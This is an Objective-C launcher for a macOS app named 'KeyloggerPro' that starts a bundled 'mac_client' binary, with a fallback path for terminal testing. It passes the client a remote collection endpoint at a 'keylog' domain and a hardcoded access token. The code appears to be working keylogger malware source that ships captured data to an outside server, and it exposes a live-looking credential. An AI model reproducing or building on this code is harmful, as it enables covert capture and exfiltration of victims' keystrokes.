#import <Cocoa/Cocoa.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSString *clientPath = [[NSBundle mainBundle] pathForResource:@"mac_client" ofType:nil];

        // Fallback quand on lance depuis le dossier (tests terminal)
        if (!clientPath) {
            clientPath = [[NSFileManager defaultManager]
                          currentDirectoryPath];
            clientPath = [clientPath stringByAppendingPathComponent:
                          @"KeyloggerPro.app/Contents/MacOS/mac_client"];
        }

        if (![[NSFileManager defaultManager] fileExistsAtPath:clientPath]) {
            NSLog(@"mac_client introuvable: %@", clientPath);
            return 1;
        }

        NSTask *task = [[NSTask alloc] init];
        task.launchPath = clientPath;
        task.arguments = @[
            @"https://api.keylog.claverie.site",
            @"72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ"
        ];
        [task launch];
    }
    return 0;
}

